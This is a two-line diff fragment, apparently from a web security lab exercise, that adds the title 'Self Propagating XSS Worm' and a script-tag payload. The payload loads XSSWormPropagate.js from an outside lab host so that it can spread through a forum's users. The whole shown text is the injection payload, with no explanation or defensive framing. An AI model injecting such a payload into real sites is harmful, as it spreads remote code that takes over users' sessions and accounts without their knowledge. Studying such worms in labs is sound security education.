@@ -1,0 +1,2 @@
+Self Propagating XSS Worm
+escape('<script id="worm" type="text/javascript" src="http://www.xsslabphpbb.com/XSSWormPropagate.js"></script>
